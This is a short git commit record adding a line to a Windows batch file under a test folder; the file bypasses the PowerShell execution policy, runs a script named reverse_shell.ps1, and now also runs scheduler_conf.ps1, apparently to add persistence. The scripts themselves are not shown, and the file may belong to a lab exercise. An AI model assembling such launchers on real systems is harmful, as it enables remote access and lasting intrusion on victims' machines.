6364a273c77432aea3b3cbb3e98764a1be4f1892
Samcr00t <roman.mammadov22@gmail.com>
2024-12-07 14:50:25 -0500

    scheduler process add to bat file

--- test/test2/bat_file.bat
+++ test/test2/bat_file.bat
@@ -1,2 +1,3 @@
 powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force"
 powershell -File "C:\Users\Admin\Desktop\scripts\reverse_shell.ps1
+powershell -File "C:\Users\Admin\Desktop\scripts\scheduler_conf.ps1"
